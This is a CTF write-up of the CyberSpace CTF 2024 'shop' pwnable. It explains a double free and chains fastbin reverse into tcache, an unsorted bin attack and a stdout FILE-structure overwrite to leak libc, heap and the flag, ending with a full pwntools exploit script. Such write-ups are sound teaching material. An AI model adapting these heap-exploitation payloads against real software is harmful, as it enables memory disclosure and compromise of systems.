+++
title = "CyberSpace CTF 2024 - shop"
date = "2024-10-09"
description = "CyberSpace CTF 2024 pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "fastbin reverse into tcache", "unsorted bin", "fsop", "stdout"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/shop'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

### Concept
``` bash
➜  ./shop
1. Buy a pet
2. Edit name
3. Refund
> 
```

Using `buy_143A()`, we allocate heap chunks and store the allocated address and `size`.

These are stored in globally declared `void *ptr_4060[32]` and `int size_4160[32]`. In `edit_1523()`, we input an `index` to modify the contents of the chunk stored in `ptr_4060[index]`.

Similarly, in `refund_15F6()`, we input an `index` to free the chunk stored in `ptr_4060[index]`.

Note that `read_flag_12A9()` reads the `flag` and stores it in the heap, so we don't need to get shell.


## 0x01. Vulnerability
``` c
int refund_15F6()
{
  unsigned int index; // [rsp+0h] [rbp-10h]
  void *ptr; // [rsp+8h] [rbp-8h]

  printf("Index: ");
  index = read_int_13A5();
  if ( index > 31 )
    return puts("INVALID INDEX");
  ptr = (void *)ptr_4060[index];
  if ( !ptr )
    return puts("INVALID INDEX");
  free(ptr);
  size_4160[index] = 0;
  return puts("DONE");
}
```

`refund_15F6()` verifies that `ptr_4060[index]` is not `NULL` and frees `ptr`.

It initializes `size_4160[index]` to 0 afterward but doesn't initialize `ptr_4060[index]`, making double free possible.


## 0x02. Exploit
### Fastbin reverse into tcache
While possible in older glibc versions (<=2.26), glibc 2.31 in the current docker environment has mitigation applied to prevent double free in tcache.

``` bash
1. Buy a pet
2. Edit name
3. Refund
> 3
Index: 0
DONE
1. Buy a pet
2. Edit name
3. Refund
> 3
Index: 1
DONE
1. Buy a pet
2. Edit name
3. Refund
> 3
Index: 0
free(): double free detected in tcache 2
[1]    97427 IOT instruction (core dumped)  ./chall
```

To bypass this, I used the fastbin reverse into tcache technique, referencing these resources:

- [Heap exploit - Fastbin Reverse into Tcache](https://velog.io/@chk_pass/Heap-exploit-Fastbin-Reverse-into-Tcache)
- [how2heap - fastbin_reverse_into_tcache.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.31/fastbin_reverse_into_tcache.c)

These resources assume we can free a victim chunk and write values, but since `edit` is impossible when `size_4160[index]` is `0` in this problem, we need to additionally create a fastbin dup situation.

The exploitation flow is as follows.

1. Free `7` fastbin-range chunks to fill tcache
2. Create fastbin dup using double free
3. Allocate `7` chunks to empty tcache
4. Allocate 8th chunk to manipulate `next_chunk`
5. Request chunk allocation until manipulated `next_chunk` address is allocated
6. Use allocated address for AAW

Writing the payload step by step:

``` python
    # fill tcache 0x20
    for _ in range(9):
        buy(s, 0x10)
    for i in range(7):
        refund(s, i + 1)

    # fastbin dup 8 -> 9 -> 8
    refund(s, 8)
    refund(s, 9)
    refund(s, 8)
```

Executing `refund` `7` times fills tcache, sending subsequent chunks to fastbin.

Using this, we create an `8 -> 9 -> 8` loop in fastbin.

``` python
    # clean tacahe 0x20
    for _ in range(7):
        buy(s, 0x10)
    
    # partially overwrite next_chunk
    buy(s, 0x10)
    edit(s, 8, b"\x40\x96")
```

After emptying tcache by executing `buy` `7` times, executing `buy` once more returns the 8th chunk.

Since this 8th chunk stored `size` in `size_4160[8]` during `buy`, `edit` is possible.

Since we haven't leaked heap yet, we can only partial overwrite lower bytes for probabilistic heap manipulation.

``` bash
gef➤  heap bins
─────────────────────────────────────── Tcachebins for thread 1 ───────────────────────────────────────
Tcachebins[idx=0, size=0x20, count=3] ←  Chunk(addr=0x555555559b70, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  
                                      ←  Chunk(addr=0x555555559b50, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  
                                      ←  Chunk(addr=0x555555559640, size=0x0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
```

The `\x40\x96` input in `edit` partially overwrites the chunk's `next_chunk` to manipulate the tcache list.

Looking closely, `0x555555559640` comes at the end of the tcache list. Although its `size` is `0`, tcache doesn't verify `size` during allocation, so the manipulated `next_chunk` gets allocated.

Thinking about it, carefully controlling size and position when allocating heap chunks to only overwrite one byte might enable exploitation without probability issues.

``` python
    # allocate overwritten heap address
    buy(0x10)
    buy(0x10)
    buy(0x10)               # index 11 ; overwritten heap address

    # overwrite chunk size
    edit(s, 11, p64(0) + p64(0x421))
```

As in the payload above, the partially overwritten address is returned during the 3rd `buy`, allowing us to modify values stored in heap.

### Unsorted bin attack
To proceed further, the binary has no output sections, making leaks impossible.

Thinking about what we have, while we don't know addresses, manipulating `next_chunk` enables AAW.

While pondering, I thought that like partially overwriting the heap address stored in `next_chunk` earlier, if a libc address is stored there, we could partial overwrite to write to the libc region.

Getting a libc address into `next_chunk` is possible with unsorted bin attack, but requires careful chunk overlapping.

Illustrated as follows.

![exploit scenario](https://github.com/user-attachments/assets/aece5a2b-2051-4b43-80b1-df68fea69396)

First, since we'll ultimately perform AAW using chunks in fastbin, we send sufficiently sized (`0x60`) chunks to fastbin.

To send the victim chunk to unsorted bin, we need to carefully position intermediate chunks so the offset with `next_chunk` matches `size`.

Also, since `next_chunk` being top chunk merges with top chunk instead of going to unsorted bin, we need to consider this.

``` python
    # fill tcache 0x70
    for _ in range(8):
        buy(s, 0x60)
    for i in range(7):
        refund(s, i)
    buy(s, 0x3a0)           # index 0 ; align next chunk
    
    # 0x555555559650 chunk goes to fastbin
    refund(s, 7)
```

This sends the `index 7` chunk (`0x555555559650`) to fastbin, and allocating a `0x3a0` chunk afterward creates the form in the first diagram.

Now to overwrite chunk size, we use the fastbin reverse into tcache vulnerability.

``` python
    # partially overwrite next_chunk
    buy(s, 0x10)
    edit(s, 8, b"\x40\x96")
    
    # allocate overwritten heap address
    buy(s, 0x10)
    buy(s, 0x10)
    buy(s, 0x10)            # index 11 ; overwritten heap address

    # overwrite chunk size
    edit(s, 11, p64(0) + p64(0x421))
```

Executing this payload creates the second diagram. We need to free the `0x555555559650` chunk, but there's no pointer pointing to `0x555555559650`.

Since it's an already freed chunk address, we can't access it without allocating a `0x60`-sized chunk again.

So we use the fastbin reverse into tcache vulnerability once more to get that address returned.

``` python
    # partially overwrite next_chunk
    buy(s, 0x10)
    edit(s, 12, b"\x50\x96")

    # allocate overwritten heap address
    buy(s, 0x10)
    buy(s, 0x10)
    buy(s, 0x10)            # index 15 ; overwritten heap address
    
    # free(0x555555559650) ; move chunk to unsorted bin
    refund(s, 15)
```

This time, instead of editing the returned address, we `refund` to free it, creating the third diagram.

``` bash
gef➤  heap bins
───────────────────────────────── Fastbins for arena at 0x7ffff7fbfb80 ─────────────────────────────────
Fastbins[idx=5, size=0x70]  ←  Chunk(addr=0x555555559650, size=0x420, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) [incorrect fastbin_index]  
                            ←  Chunk(addr=0x7ffff7fbfbf0, size=0x0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) [incorrect fastbin_index]  
                            ←  Chunk(addr=0x555555559650, size=0x420, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  →  [loop detected]
Fastbins[idx=6, size=0x80] 0x00
─────────────────────────────── Unsorted Bin for arena at 0x7ffff7fbfb80 ───────────────────────────────
[+] unsorted_bins[0]: fw=0x555555559640, bk=0x555555559640
 →   Chunk(addr=0x555555559650, size=0x420, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in unsorted bin.
```

Since the `0x555555559650` chunk remains in fastbin, `main_arena` in `next_chunk` is interpreted as the next chunk, enabling libc region allocation.

However, fastbin verifies `size`, so we need to restore the chunk size overwritten to `0x421`.

``` python
    # restore chunk size
    edit(s, 11, p64(0) + p64(0x71))
```

### Stdout attack
There's a technique for libc leak when you can change stdout's `flag`. I referenced this Korean resource:

- [stdout의 file structure flag를 이용한 libc leak](https://jeongzero.oopy.io/4c0f8878-4733-48aa-8ead-5f06a0e40490)

After successfully performing unsorted bin attack, the `main_arena` address at `0x555555559650` is as follows.

``` bash
gef➤  x/4gx 0x555555559650 - 0x10
0x555555559640: 0x0000000000000000      0x0000000000000071
0x555555559650: 0x00007ffff7fbfbe0      0x00007ffff7fbfbe0
```

Meanwhile, `stdout` points to an `_IO_FILE` structure stored in the libc region, with this address.

``` bash
gef➤  x/6gx 0x555555558020
0x555555558020 <stdout>:        0x00007ffff7fc06a0      0x0000000000000000
0x555555558030 <stdin>:         0x00007ffff7fbf980      0x0000000000000000
0x555555558040 <stderr>:        0x00007ffff7fc05c0      0x0000000000000000
```

`0x7ffff7fbfbe0` and `0x7ffff7fc06a0` differ by `3` bytes without ASLR, but probabilistically differ by only `2` bytes with ASLR enabled, making exploitation possible with 1/16 probability when partial overwriting.

``` python
    # partially overwrite main_arena -> stdout
    buy(s, 0x60)
    edit(s, 22, b"\xa0\x06\xfc")    # aslr off
    # edit(s, 22, b"\xa0\x76")      # aslr on
    
    for _ in range(3):
        buy(s, 0x60)
```

With 1/16 probability of allocating the libc address storing stdout's `_IO_FILE` structure, we can change the `flag` to output libc addresses.

To summarize the exploit technique, when `_IO_IS_APPENDING` is added to `flag`, `_IO_new_do_write` is called as follows, so we need to manipulate `_IO_write_base` and `_IO_write_ptr`.

``` c
// _IO_do_write (FILE *fp, const char *data, size_t to_do)
_IO_do_write (stdout, f->_IO_write_base, f->_IO_write_ptr - f->_IO_write_base)
```

값을 변경하기 전 `stdout`의 `_IO_FILE` 구조체의 상태는 다음과 같다.

``` bash
gef➤  p *(struct _IO_FILE *) 0x7ffff7fc06a0
$1 = {
  _flags = 0xfbad2887,
  _IO_read_ptr = 0x7ffff7fc0723 <_IO_2_1_stdout_+131> "\n",
  _IO_read_end = 0x7ffff7fc0723 <_IO_2_1_stdout_+131> "\n",
  _IO_read_base = 0x7ffff7fc0723 <_IO_2_1_stdout_+131> "\n",
  _IO_write_base = 0x7ffff7fc0723 <_IO_2_1_stdout_+131> "\n",
  _IO_write_ptr = 0x7ffff7fc0723 <_IO_2_1_stdout_+131> "\n",
  _IO_write_end = 0x7ffff7fc0723 <_IO_2_1_stdout_+131> "\n",
  _IO_buf_base = 0x7ffff7fc0723 <_IO_2_1_stdout_+131> "\n",
  _IO_buf_end = 0x7ffff7fc0724 <_IO_2_1_stdout_+132> "",
  ...
}
```

The referenced resource overwrites the first byte of `_IO_write_base` with `\x00`, which would call `_IO_do_write` as follows.

``` c
// _IO_do_write (FILE *fp, const char *data, size_t to_do)
_IO_do_write (stdout, 0x7ffff7fc0700, 0x23)
```

This output prints the libc address contained in the `_IO_FILE` structure.

``` python
    # leak libc
    io_is_appending = 0x1000
    payload = p64(0xfbad2887 | io_is_appending)
    payload += b"\x00" * 0x19
    r = edit(s, 25, payload)
```

Since libc leak is possible through this payload, areas like `_IO_read_XXX` don't seem important for output.

Using this `stdout` structure enables AAR. Since the binary reads `flag` and stores it in heap memory, having the heap address lets us obtain the `flag`.

Opposite to unsorted bin attack where we put `main_arena` address in `next_chunk`, `main_arena` contains heap addresses.

Since `main_arena` is a variable stored in a fixed libc region, we calculate the offset and overwrite the value.

``` python
    # leak heap - print main_arena
    payload = p64(0xfbad2887 | io_is_appending)
    payload += b"\x00" * 0x18
    payload += p64(main_arena)          # _IO_write_base
    payload += p64(main_arena + 0x20)   # _IO_write_ptr
    payload += p64(main_arena + 0x20)   # _IO_write_end
    r = edit(s, 25, payload)
```

Note that output occurs when `_IO_write_end` equals `_IO_write_ptr`.

I'll remember this for future memory leaks using `stdout`.

``` python
    # print flag
    payload = p64(0xfbad2887 | io_is_appending)
    payload += b"\x00" * 0x18
    payload += p64(flag)                # _IO_write_base
    payload += p64(flag + 0x30)         # _IO_write_ptr
    payload += p64(flag + 0x30)         # _IO_write_end
    r = edit(s, 25, payload)
```

After obtaining the heap address, we can obtain the `flag` the same way.


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
from argparse import ArgumentParser

BINARY = "chall"
LIBRARY = "libc-2.31.so"
CONTAINER = "b212a05a74cb"
code_base = 0x555555554000
bp = {
    'read_int_edit' : code_base + 0x1545,
    'read_int_refund' : code_base + 0x1618
}

index_list = [0] * 32
def print_index(op, num = 0):
    if op == "pop":
        index_list[num] = 0
        index = num
    elif op == "push":
        for _ in range(len(index_list)):
            if index_list[_] == 0:
                index_list[_] = num
                index = _
                break
    hex_numbers = [hex(num)[2:].rjust(3) for num in index_list[0:16]]
    log.info(f"{', '.join(hex_numbers)} ; {op} {index}")

def buy(s, size):
    s.sendline(b"1")
    s.sendlineafter(b"much? ", str(size).encode())
    print_index("push", size)
    return s.recvuntil(b"> ")

def edit(s, index, name):
    s.sendline(b"2")
    s.sendlineafter(b"Index: ", str(index).encode())
    s.sendafter(b"Name: ", name)
    return s.recvuntil(b"> ")

def refund(s, index):
    s.sendline(b"3")
    s.sendlineafter(b"Index: ", str(index).encode())
    print_index("pop", index)
    return s.recvuntil(b"> ")

gs = f'''
!b *{bp["read_int_refund"]}
gef config gef.bruteforce_main_arena True
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def main(server, port, debug):
    if(port):
        s = remote(server, port)
        if debug:
            pid = os.popen(f"sudo docker top {CONTAINER} -eo pid,comm | grep {BINARY} | awk '{{print $1}}'").read()
            gdb.attach(int(pid), gs, exe=BINARY, sysroot="./")
        else:
            context.log_level = "ERROR"
    else:
        s = process(BINARY, env={"LD_PRELOAD" : LIBRARY})
        if debug:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)

    s.recvuntil(b"> ").decode()

    # fill tcache 0x70
    for _ in range(8):
        buy(s, 0x60)
    for i in range(7):
        refund(s, i)
    buy(s, 0x3a0)           # index 0 ; align next chunk
    
    # 0x555555559650 chunk goes to fastbin
    refund(s, 7)

    # fill tcache 0x20
    for _ in range(9):
        buy(s, 0x10)
    for i in range(7):
        refund(s, i + 1)

    # fastbin dup 8 -> 9 -> 8
    refund(s, 8)
    refund(s, 9)
    refund(s, 8)

    # clean tacahe 0x20
    for _ in range(7):
        buy(s, 0x10)

    # partially overwrite next_chunk
    buy(s, 0x10)
    edit(s, 8, b"\x40\x96")
    
    # allocate overwritten heap address
    buy(s, 0x10)
    buy(s, 0x10)
    buy(s, 0x10)            # index 11 ; overwritten heap address

    # overwrite chunk size
    edit(s, 11, p64(0) + p64(0x421))

    # fill tcache 0x20
    for _ in range(2):
        buy(s, 0x10)
    for i in range(7):
        refund(s, i + 1)

    # fastbin dup 12 -> 13 -> 12
    refund(s, 12)
    refund(s, 13)
    refund(s, 12)

    # clean tcache 0x20
    for _ in range(7):
        buy(s, 0x10)

    # partially overwrite next_chunk
    buy(s, 0x10)
    edit(s, 12, b"\x50\x96")

    # allocate overwritten heap address
    buy(s, 0x10)
    buy(s, 0x10)
    buy(s, 0x10)            # index 15 ; overwritten heap address
    
    # free(0x555555559650) ; move chunk to unsorted bin
    refund(s, 15)

    # clean tcache 0x70
    for _ in range(7):
        buy(s, 0x60)

    # restore chunk size
    edit(s, 11, p64(0) + p64(0x71))

    # partially overwrite main_arena -> stdout
    buy(s, 0x60)
    edit(s, 22, b"\xa0\x06\xfc")    # aslr off
    # edit(s, 22, b"\xa0\x76")      # aslr on
    
    for _ in range(3):
        buy(s, 0x60)

    # leak libc
    io_is_appending = 0x1000
    payload = p64(0xfbad2887 | io_is_appending)
    payload += b"\x00" * 0x19
    r = edit(s, 25, payload)

    lib.address = u64(r[0x8:0x10]) - 0x1ec980
    log.info(f"libc : {hex(lib.address)}")
    main_arena = lib.address + 0x1ecbe0

    # leak heap - print main_arena
    payload = p64(0xfbad2887 | io_is_appending)
    payload += b"\x00" * 0x18
    payload += p64(main_arena)          # _IO_write_base
    payload += p64(main_arena + 0x20)   # _IO_write_ptr
    payload += p64(main_arena + 0x20)   # _IO_write_end
    r = edit(s, 25, payload)
    
    heap = u64(r[0:8]) - 0xbc0
    log.info(f"heap : {hex(heap)}")
    flag = heap + 0x308

    # print flag
    payload = p64(0xfbad2887 | io_is_appending)
    payload += b"\x00" * 0x18
    payload += p64(flag)                # _IO_write_base
    payload += p64(flag + 0x30)         # _IO_write_ptr
    payload += p64(flag + 0x30)         # _IO_write_end
    r = edit(s, 25, payload)

    f = r.split(b'\n')[0]
    context.log_level ="DEBUG"
    log.success(f"flag : {f.decode()}")
    
    s.close()

if __name__=='__main__':
    parser = ArgumentParser()
    parser.add_argument('-s', '--server', type=str, default="0.0.0.0")
    parser.add_argument('-p', '--port', type=int)
    parser.add_argument('-d', '--debug', type=int, default=1)
    args = parser.parse_args()

    main(args.server, args.port, args.debug)
```